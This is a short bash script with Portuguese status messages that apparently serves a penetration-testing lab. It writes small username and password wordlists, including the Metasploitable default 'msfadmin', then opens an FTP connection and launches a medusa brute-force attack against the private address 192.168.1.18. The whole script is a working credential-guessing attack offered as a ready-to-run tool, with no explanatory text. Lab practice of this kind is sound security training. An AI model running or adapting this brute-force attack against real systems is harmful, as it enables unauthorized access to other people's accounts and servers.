            #!/bin/bash
            echo "[+] Iniciando ataque FTP..."
            TARGET="192.168.1.18"

            echo "[+] Criando wordlists..."
            echo -e "user
msfadmin
admin
root" > ../wordlists/users.txt
            echo -e "123456
password
qwerty
msfadmin" > ../wordlists/pass.txt

            echo "[+] Testando conexão FTP..."
            ftp $TARGET

            echo "[+] Executando força bruta..."
            medusa -h $TARGET -U ../wordlists/users.txt -P ../wordlists/pass.txt -M ftp -t 6

            echo "[+] Ataque FTP concluído!"
